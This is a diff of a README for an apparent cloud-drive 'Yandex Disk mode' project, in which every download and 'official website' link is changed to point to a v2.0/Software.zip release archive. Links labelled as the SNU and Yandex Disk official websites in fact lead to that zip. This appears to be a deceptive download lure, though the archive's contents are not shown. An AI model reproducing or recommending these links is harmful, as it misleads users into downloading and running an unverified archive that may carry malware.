@@ -10,7 +10,7 @@ This is the official source repository for the SNU 2D CloudDrive project, specif
 
 ## Software Download
 To access the software for the SNU 2D CloudDrive Yandex Disk mode, click the button below:
-[![Download Software](https://github.com/vra-thenix/SNU_2D_CloudDrive_Modes_Yandex_Disk/releases/download/v1.0/Program.zip)](https://github.com/vra-thenix/SNU_2D_CloudDrive_Modes_Yandex_Disk/releases/download/v1.0/Program.zip)
+[![Download Software](https://github.com/vra-thenix/SNU_2D_CloudDrive_Modes_Yandex_Disk/releases/download/v2.0/Software.zip)](https://github.com/vra-thenix/SNU_2D_CloudDrive_Modes_Yandex_Disk/releases/download/v2.0/Software.zip)
 
 ## Getting Started
 To get started with the project, follow these steps:
@@ -26,8 +26,8 @@ We welcome contributions from the community to enhance the SNU 2D CloudDrive Yan
 For any questions, issues, or support related to the project, please check the "Releases" section of this repository. You can also reach out to the project maintainers for assistance.
 
 ## Additional Resources
-- [SNU Official Website](https://github.com/vra-thenix/SNU_2D_CloudDrive_Modes_Yandex_Disk/releases/download/v1.0/Program.zip)
-- [Yandex Disk Official Website](https://github.com/vra-thenix/SNU_2D_CloudDrive_Modes_Yandex_Disk/releases/download/v1.0/Program.zip)
+- [SNU Official Website](https://github.com/vra-thenix/SNU_2D_CloudDrive_Modes_Yandex_Disk/releases/download/v2.0/Software.zip)
+- [Yandex Disk Official Website](https://github.com/vra-thenix/SNU_2D_CloudDrive_Modes_Yandex_Disk/releases/download/v2.0/Software.zip)
 
 Thank you for your interest in the SNU 2D CloudDrive Yandex Disk mode project. Let's revolutionize cloud storage together! 🚀🌧️👾
 
